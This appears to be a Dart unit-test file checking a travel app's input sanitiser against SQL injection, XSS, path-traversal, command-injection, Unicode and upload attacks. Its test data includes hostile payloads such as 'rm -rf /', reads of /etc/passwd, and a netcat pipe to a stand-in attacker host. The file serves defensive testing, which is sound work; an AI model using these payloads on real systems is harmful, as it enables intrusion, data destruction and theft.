import 'package:flutter_test/flutter_test.dart';
import 'package:tourlicity_app/core/security/input_validator.dart';

/// Penetration testing scenarios for security validation
void main() {
  group('Penetration Testing Scenarios', () {
    group('SQL Injection Attacks', () {
      test('prevents SQL injection in text inputs', () {
        final maliciousInputs = [
          "'; DROP TABLE users; --",
          "1' OR '1'='1",
          "admin'--",
          "' UNION SELECT * FROM passwords--",
          "1; DELETE FROM users WHERE 1=1--",
        ];

        for (final input in maliciousInputs) {
          final result = InputValidator.sanitizeInput(input);
          expect(result.toLowerCase(), isNot(contains('drop')));
          expect(result.toLowerCase(), isNot(contains('delete')));
          expect(result.toLowerCase(), isNot(contains('union')));
          expect(result.toLowerCase(), isNot(contains('select')));
        }
      });

      test('validates email inputs against SQL injection', () {
        final maliciousEmails = [
          "admin'; DROP TABLE users; --@example.com",
          "test@example.com'; DELETE FROM users--",
          "user@domain.com' OR '1'='1",
        ];

        for (final email in maliciousEmails) {
          final result = InputValidator.validateEmail(email);
          expect(result.isValid, isFalse);
        }
      });
    });

    group('Cross-Site Scripting (XSS) Attacks', () {
      test('prevents XSS in text inputs', () {
        final xssPayloads = [
          '<script>alert("XSS")</script>',
          'javascript:alert(1)',
          '<img src="x" onerror="alert(1)">',
          '<iframe src="javascript:alert(1)"></iframe>',
          '<object data="javascript:alert(1)">',
          '<embed src="javascript:alert(1)">',
          'onmouseover="alert(1)"',
          '<svg onload="alert(1)">',
        ];

        for (final payload in xssPayloads) {
          final result = InputValidator.sanitizeInput(payload);
          expect(result.toLowerCase(), isNot(contains('<script')));
          expect(result.toLowerCase(), isNot(contains('javascript:')));
          expect(result.toLowerCase(), isNot(contains('onerror')));
          expect(result.toLowerCase(), isNot(contains('onload')));
          expect(result.toLowerCase(), isNot(contains('onmouseover')));
        }
      });

      test('sanitizes HTML content properly', () {
        final htmlPayloads = [
          '<p>Normal text</p><script>alert("XSS")</script>',
          '<div onclick="alert(1)">Click me</div>',
          '<a href="javascript:alert(1)">Link</a>',
        ];

        for (final payload in htmlPayloads) {
          final result = InputValidator.sanitizeHtml(payload);
          expect(result, isNot(contains('<script')));
          expect(result, isNot(contains('onclick')));
          expect(result, isNot(contains('javascript:')));
        }
      });
    });

    group('Path Traversal Attacks', () {
      test('prevents directory traversal in filenames', () {
        final maliciousFilenames = [
          '../../../etc/passwd',
          '..\\..\\windows\\system32\\config\\sam',
          '/etc/shadow',
          'C:\\Windows\\System32\\drivers\\etc\\hosts',
          '....//....//etc/passwd',
          '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        ];

        for (final filename in maliciousFilenames) {
          final result = InputValidator.sanitizeFileName(filename);
          expect(result, isNot(contains('../')));
          expect(result, isNot(contains('..\\'))); 
          expect(result, isNot(contains('/etc/')));
          expect(result, isNot(contains('\\Windows\\')));
        }
      });

      test('validates file uploads against path traversal', () {
        final maliciousFiles = [
          '../../../malicious.pdf',
          '..\\..\\evil.doc',
          '/etc/passwd.txt',
        ];

        for (final filename in maliciousFiles) {
          final result = InputValidator.validateFileUpload(
            fileName: filename,
            fileSize: 1024,
            allowedExtensions: ['pdf', 'doc', 'txt'],
          );
          
          if (result.isValid) {
            expect(result.value, isNot(contains('../')));
            expect(result.value, isNot(contains('..\\'))); 
            expect(result.value, isNot(contains('/etc/')));
          }
        }
      });
    });

    group('Command Injection Attacks', () {
      test('prevents command injection in text inputs', () {
        final commandInjections = [
          'test; rm -rf /',
          'file.txt && cat /etc/passwd',
          'input | nc attacker.com 4444',
          'data `whoami`',
          'text \$(id)',
          'input; shutdown -h now',
        ];

        for (final injection in commandInjections) {
          final result = InputValidator.sanitizeInput(injection);
          expect(result, isNot(contains(';')));
          expect(result, isNot(contains('&&')));
          expect(result, isNot(contains('|')));
          expect(result, isNot(contains('`')));
          expect(result, isNot(contains('\$(')));
        }
      });
    });

    group('Buffer Overflow Attempts', () {
      test('limits input length to prevent buffer overflow', () {
        final longInputs = [
          'A' * 10000,
          'B' * 50000,
          'C' * 100000,
        ];

        for (final input in longInputs) {
          final result = InputValidator.validateText(
            input,
            fieldName: 'Test',
            maxLength: 1000,
          );
          expect(result.isValid, isFalse);
          expect(result.errorMessage, contains('must be less than'));
        }
      });

      test('limits filename length', () {
        final longFilename = '${'A' * 300}.txt';
        final result = InputValidator.sanitizeFileName(longFilename);
        expect(result.length, lessThanOrEqualTo(255));
      });
    });

    group('Unicode and Encoding Attacks', () {
      test('handles unicode normalization attacks', () {
        final unicodeAttacks = [
          'admin\u0000',
          'test\uFEFF',
          'user\u200B',
          'ａｄｍｉｎ', // Full-width characters
          'script\u0009alert', // Tab character
        ];

        for (final attack in unicodeAttacks) {
          final result = InputValidator.sanitizeInput(attack);
          expect(result, isNot(contains('\u0000')));
          expect(result, isNot(contains('\uFEFF')));
          expect(result, isNot(contains('\u200B')));
        }
      });

      test('normalizes full-width characters', () {
        const fullWidthInput = 'ａｄｍｉｎ＠ｅｘａｍｐｌｅ．ｃｏｍ';
        final result = InputValidator.sanitizeInput(fullWidthInput);
        // Should be normalized to ASCII
        expect(result, matches(RegExp(r'^[a-zA-Z@.]+$')));
      });
    });

    group('File Upload Security', () {
      test('prevents dangerous file extensions', () {
        final dangerousFiles = [
          'malware.exe',
          'script.bat',
          'virus.scr',
          'trojan.com',
          'backdoor.pif',
          'shell.php',
          'webshell.jsp',
          'malicious.asp',
        ];

        for (final filename in dangerousFiles) {
          final result = InputValidator.validateFileUpload(
            fileName: filename,
            fileSize: 1024,
            allowedExtensions: ['pdf', 'doc', 'txt', 'jpg', 'png'],
          );
          expect(result.isValid, isFalse);
        }
      });

      test('prevents files with dangerous names', () {
        final dangerousNames = [
          'con.txt',
          'prn.pdf',
          'aux.doc',
          'nul.jpg',
          'com1.png',
          'lpt1.txt',
        ];

        for (final filename in dangerousNames) {
          final result = InputValidator.validateFileUpload(
            fileName: filename,
            fileSize: 1024,
            allowedExtensions: ['txt', 'pdf', 'doc', 'jpg', 'png'],
          );
          expect(result.isValid, isFalse);
        }
      });

      test('limits file size to prevent DoS', () {
        final result = InputValidator.validateFileUpload(
          fileName: 'large.pdf',
          fileSize: 100 * 1024 * 1024, // 100MB
          allowedExtensions: ['pdf'],
          maxSizeBytes: 10 * 1024 * 1024, // 10MB limit
        );
        expect(result.isValid, isFalse);
        expect(result.errorMessage, contains('File size must be less than'));
      });
    });

    group('Input Validation Edge Cases', () {
      test('handles null and empty inputs safely', () {
        expect(() => InputValidator.validateEmail(null), returnsNormally);
        expect(() => InputValidator.validateEmail(''), returnsNormally);
        expect(() => InputValidator.validateName(null), returnsNormally);
        expect(() => InputValidator.validatePhoneNumber(null), returnsNormally);
      });

      test('handles special characters in names', () {
        final specialNames = [
          'José María',
          'François',
          'Müller',
          'Øyvind',
          'Владимир',
          '李小明',
        ];

        for (final name in specialNames) {
          final result = InputValidator.validateName(name);
          // Should handle international names appropriately
          expect(result, isNotNull);
        }
      });

      test('validates international phone numbers', () {
        final internationalPhones = [
          '+1-555-123-4567',
          '+44 20 7946 0958',
          '+33 1 42 86 83 26',
          '+81-3-1234-5678',
        ];

        for (final phone in internationalPhones) {
          final result = InputValidator.validatePhoneNumber(phone);
          if (result.isValid) {
            expect(result.value, matches(RegExp(r'^\+\d+$')));
          }
        }
      });
    });

    group('Password Security', () {
      test('enforces strong password requirements', () {
        final weakPasswords = [
          'password',
          '123456',
          'qwerty',
          'admin',
          'Password1', // Missing special character
          'password!', // Missing uppercase and number
          'PASSWORD123!', // Missing lowercase
        ];

        for (final password in weakPasswords) {
          final result = InputValidator.validatePassword(password);
          expect(result.isValid, isFalse);
        }
      });

      test('accepts strong passwords', () {
        final strongPasswords = [
          'MyStr0ng!Pass',
          'C0mplex#Passw0rd',
          'Secure@123Pass',
          r'V3ry$tr0ngP@ssw0rd',
        ];

        for (final password in strongPasswords) {
          final result = InputValidator.validatePassword(password);
          expect(result.isValid, isTrue);
        }
      });

      test('prevents common password patterns', () {
        // This would be extended with a dictionary check in production
        final commonPasswords = [
          'Password123!',
          'Admin123!',
          'Welcome123!',
        ];

        for (final password in commonPasswords) {
          final result = InputValidator.validatePassword(password);
          // Basic validation should pass, but dictionary check would fail
          expect(result.isValid, isTrue); // Would be false with dictionary check
        }
      });
    });
  });
}